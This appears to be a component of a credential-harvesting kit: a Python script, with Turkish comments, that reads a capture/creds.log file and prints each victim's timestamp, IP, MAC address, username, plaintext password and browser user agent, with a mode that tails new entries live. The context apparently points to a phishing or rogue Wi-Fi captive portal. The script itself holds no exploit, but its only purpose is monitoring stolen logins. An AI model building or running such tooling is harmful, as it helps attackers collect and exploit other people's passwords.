#!/usr/bin/env python3
"""Yakalanan kimlik bilgilerini okunur biçimde göster."""
import json
import os
import sys
import time

BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(BASE, "capture", "creds.log")


def render(line: str) -> str:
    try:
        r = json.loads(line)
    except json.JSONDecodeError:
        return ""
    return (
        f"\033[1m{r.get('ts', '?')}\033[0m  "
        f"{r.get('ip', '?')}  {r.get('mac') or '-'}\n"
        f"   user : \033[1;33m{r.get('username', '')}\033[0m\n"
        f"   pass : \033[1;31m{r.get('password', '')}\033[0m\n"
        f"   ua   : {r.get('ua', '')[:90]}\n"
    )


def main() -> None:
    follow = "-f" in sys.argv or "--follow" in sys.argv
    if not os.path.exists(LOG):
        print("henüz kayıt yok:", LOG)
        return

    seen = 0
    while True:
        with open(LOG, encoding="utf-8") as f:
            lines = f.readlines()
        for line in lines[seen:]:
            out = render(line)
            if out:
                print(out)
        seen = len(lines)
        if not follow:
            break
        time.sleep(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
